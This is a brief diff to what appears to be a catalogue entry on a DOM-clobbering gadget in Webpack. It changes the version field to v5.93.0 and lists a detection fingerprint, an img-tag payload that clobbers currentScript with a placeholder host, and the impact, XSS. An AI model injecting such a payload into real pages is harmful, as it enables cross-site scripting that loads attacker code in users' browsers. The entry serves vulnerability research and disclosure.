@@ -4,7 +4,7 @@
 
 + Library: Webpack
 + Stars: 64.4K
-+ Version: 5.x.x
++ Version: v5.93.0
 + Fingerprint: `typeof __webpack_require__ !== 'undefined' && __webpack_require__.hasOwnProperty('p')`
 + Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
 + Impact: XSS
